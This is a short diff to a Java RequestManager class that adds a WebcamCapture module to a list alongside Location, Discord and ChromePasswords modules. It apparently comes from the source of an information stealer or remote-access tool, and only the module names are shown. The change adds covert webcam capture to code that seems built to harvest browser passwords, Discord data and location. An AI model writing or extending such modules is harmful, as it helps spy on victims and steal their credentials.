@@ -13,6 +13,7 @@ public class RequestManager {
     public RequestManager() {
         requests.addAll(Arrays.asList(
                 new MiscGrabs(),
+                new WebcamCapture(),
                 new Location(),
                 new Discord(),
                 new ChromePasswords(),
